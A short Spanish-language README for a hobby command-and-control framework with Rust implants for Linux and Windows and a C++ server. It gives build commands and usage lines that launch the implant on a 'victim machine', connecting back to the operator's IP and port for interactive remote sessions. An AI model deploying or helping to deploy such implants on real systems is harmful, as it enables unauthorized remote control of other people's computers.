# El pikachu C2
Un increible e impresionante C2 hecho por elpikachu xd

## Features
- implant linux & windows
- implantes hechos en Rust ❤️
- server en c++ 🐀
- multisesion
- esta chido

## Como compilar
### dependencias:
- rustup
- mingw
- g++

para el server:
```sh
make 
```
para el implante:
```sh
make linux #compila linux duh!
make windows #adivina qe compila xd
```

## Como usar

en el server
```sh
./server <port>
```


en el equipo victima

```sh
#win
./pika.exe <ip> <port>

#linux
./pika <ip> <port>
```

## help
```sh
c2> help
sessions              list sessions
console <session_id>  interact with session
help                  show this help
exit                  quit server

#dentro de la consola
back                  return to cli
```
